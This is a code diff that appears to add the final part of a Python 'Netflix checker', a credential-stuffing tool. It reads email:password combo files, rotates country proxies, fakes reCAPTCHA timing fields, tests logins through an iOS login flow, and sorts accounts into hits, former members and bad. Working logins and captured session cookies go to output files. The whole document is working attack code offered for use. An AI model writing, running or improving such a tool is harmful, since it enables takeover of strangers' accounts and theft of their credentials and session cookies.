@@ -995,4 +995,162 @@ async def _check_ios(email, password, proxy_url, country, lowcode, cc):
                     {"name": "userLoginId",           "value": {"stringValue": email}},
                     {"name": "countryCode",           "value": {"stringValue": cc}},
                     {"name": "countryIsoCode",        "value": {"stringValue": country}},
-               
+                    {"name": "recaptchaError",        "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
+                    {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(1200, 3000)}},
+                ], av, country, lowcode, ua)
+                low2 = r2.lower(); tids2 = _tids(r2); txts2 = ' '.join(_texts(r2)).lower()
+                if (tids2 & _OTP_TIDS) or any(k in txts2 for k in _OTP_KW):
+                    if not (_has_pw(tids2) and _has_submit(tids2)): return 'BAD', '', ''
+                if any(sig in r2 or sig in low2 for sig in _LOGIN_OK):
+                    cookies = await _extract_cookies_ios(s)
+                    info = await _verify_account_ios(s, country)
+                    if info and info.get('_active'):
+                        return 'HIT', _fmt_capture_ios(info, country, cookies), cookies
+                    elif info is not None:
+                        return 'FREE', _fmt_free_ios(info, country, cookies), cookies
+                    else:
+                        return 'HIT', f'Login OK | Cookies = {cookies} | by = {TAG}', cookies
+                if any(kw in txts2 for kw in _TRANSIENT):
+                    if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.35)); continue
+                    return 'RETRY', '', ''
+                if (tids2 & _FREE_TIDS) or any(kw in txts2 for kw in _FREE_KW):
+                    ck = await _extract_cookies_ios(s)
+                    return 'FREE', f'Former Member | Cookies = {ck} | by = {TAG}', ck
+                if tids2 & _NEVER_TIDS: return 'BAD', '', ''
+                if any(kw in low2 or kw in txts2 for kw in _BAD_KW): return 'BAD', '', ''
+                if _has_pw(tids2) and _has_submit(tids2):
+                    if not any(kw in txts2 for kw in _TRANSIENT): return 'BAD', '', ''
+                if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.3)); continue
+                return 'RETRY', '', ''
+        except Exception as exc:
+            err = str(exc).lower()
+            if any(x in err for x in _NET_ERR):
+                if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.35)); continue
+                return 'RETRY', '', ''
+            if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.3)); continue
+            return 'BAD', '', ''
+    return 'RETRY', '', ''
+
+async def _worker_ios(q, pool, stats, country, lowcode, cc, out, done_ev):
+    while not done_ev.is_set():
+        try:
+            item = await asyncio.wait_for(q.get(), timeout=1.0)
+        except asyncio.TimeoutError:
+            continue
+        try:
+            if isinstance(item, tuple) and len(item) == 3:
+                email, pw, retries = item
+            else:
+                q.task_done(); continue
+            email = email.strip(); pw = pw.strip()
+            if not email or not pw: q.task_done(); continue
+            proxy_url = pool.next() if pool else None
+            status, detail, cookies = await _check_ios(email, pw, proxy_url, country, lowcode, cc)
+            if status == 'RETRY':
+                if retries < MAX_OUTER_IOS:
+                    stats.inc_retry(); await q.put((email, pw, retries + 1)); q.task_done(); continue
+                status = 'BAD'
+            stats.add(status.lower())
+            ep = f"{email}:{pw}"
+            if status == 'HIT':
+                line = f"{ep} | {detail}"
+                _log('HIT', line); _save(out['hit'], line)
+                if cookies: _save(out['cookies'], f"{ep} | {cookies}")
+            elif status == 'FREE':
+                line = f"{ep} | {detail}"
+                _log('FREE', line); _save(out['free'], line)
+                if cookies: _save(out['cookies'], f"{ep} | {cookies}")
+            else:
+                _save(out['bad'], ep)
+            _bar(stats)
+        except Exception:
+            try:
+                stats.add('bad')
+                if 'email' in dir() and 'pw' in dir(): _save(out['bad'], f"{email}:{pw}")
+            except: pass
+        finally:
+            try: q.task_done()
+            except ValueError: pass
+
+async def _run_batch_ios(cc, combos, proxy_components, threads_n, out):
+    cc_upper = cc if cc != 'XX' else 'US'
+    if proxy_components:
+        cc_proxies = [_country_proxy_url(u, p, h, pt, pr, cc) for u, p, h, pt, pr in proxy_components]
+    else:
+        cc_proxies = []
+    if cc != 'XX':
+        country = cc_upper; lowcode = country.lower()
+    else:
+        country, lowcode = ('US', 'us')
+        if cc_proxies:
+            country, lowcode, _ = _detect_country_br(cc_proxies[0])
+            
+    pool = ProxyPool(cc_proxies) if cc_proxies else None
+    actual = min(threads_n, len(combos))
+    q = asyncio.Queue()
+    for email, pw in combos: q.put_nowait((email, pw, 0))
+    
+    stats = Stats(len(combos))
+    done_ev = asyncio.Event()
+    
+    tasks = []
+    for _ in range(actual):
+        t = asyncio.create_task(_worker_ios(q, pool, stats, country, lowcode, cc, out, done_ev))
+        tasks.append(t)
+        
+    await q.join()
+    done_ev.set()
+    for t in tasks: t.cancel()
+    return stats
+
+def _main_menu():
+    print(f"{B}  · {M}N E T F L I X{RS} {DIM}checker{RS}")
+    print(f"{DIM}{HL*50}{RS}")
+    print(f"{C}{TAG}{RS} {DIM}v2{RS}\n")
+    
+    os.makedirs('yeat_output', exist_ok=True)
+    out = {
+        'hit': 'yeat_output/hits.txt',
+        'free': 'yeat_output/free.txt',
+        'bad': 'yeat_output/bad.txt',
+        'cookies': 'yeat_output/cookies.txt'
+    }
+    
+    mode = input(" 1 browser\n 2 ios\n » ").strip()
+    
+    combo_file = input("combo     ").strip() or "Netflix_Accounts.txt"
+    proxy_file = input("proxy     ").strip() or "proxies.txt"
+    threads_in = input("threads   ").strip() or "3"
+    threads_n = int(threads_in) if threads_in.isdigit() else 3
+    
+    print("\nloading...\n")
+    
+    combos = []
+    if os.path.exists(combo_file):
+        with open(combo_file, 'r', encoding='utf-8') as f:
+            for line in f:
+                p = _parse_combo(line)
+                if p: combos.append((p[0], p[1]))
+    print(f"{M}{len(combos)}{RS} combos ready\n")
+    
+    proxy_components = []
+    if os.path.exists(proxy_file):
+        with open(proxy_file, 'r', encoding='utf-8') as f:
+            for line in f:
+                if line.strip():
+                    proxy_components.append(_parse_proxy(line))
+                    
+    if not combos: return
+    
+    if mode == '2':
+        if not CURL_OK:
+            print(f"{R}[!] curl_cffi missing. Async mode requires curl_cffi.{RS}")
+            return
+        asyncio.run(_run_batch_ios('XX', combos, proxy_components, threads_n, out))
+    else:
+        _run_batch_br('XX', combos, proxy_components, threads_n, out)
+        
+    print(f"\n{DIM}output{RS}    {BD}yeat_output/{RS}\n")
+
+if __name__ == '__main__':
+    _main_menu()
